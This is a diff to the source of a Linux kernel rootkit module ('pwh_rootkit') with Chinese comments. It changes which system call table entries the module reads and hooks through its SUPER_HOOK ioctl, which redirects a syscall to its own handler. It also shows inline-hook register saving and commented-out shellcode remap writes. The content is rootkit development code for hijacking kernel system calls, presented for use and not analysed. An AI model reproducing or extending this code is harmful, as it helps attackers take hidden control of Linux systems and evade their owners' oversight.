@@ -137,6 +137,7 @@ static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t 
         "pop %%rcx;"
         "pop %%rbx;"
         "pop %%rax;"
+
         "push %%r15;"
         "push %%r14;"
         "push %%r13;"
@@ -280,7 +281,7 @@ static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size
     //
     // /* 寻找系统调用表 */
     // sys_call_table_finder();
-    printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[7]);
+    printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[1]);
     // poll_addr = ((size_t *)syscall_table_addr)[217];
     // super_hooker(poll_addr, (size_t)&funny_joke);
     //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
@@ -301,7 +302,7 @@ static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            hooked_addr = ((size_t *)syscall_table_addr)[217];
+            hooked_addr = ((size_t *)syscall_table_addr)[21];
             super_hooker(hooked_addr, (size_t)&funny_joke);
             //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
             break;
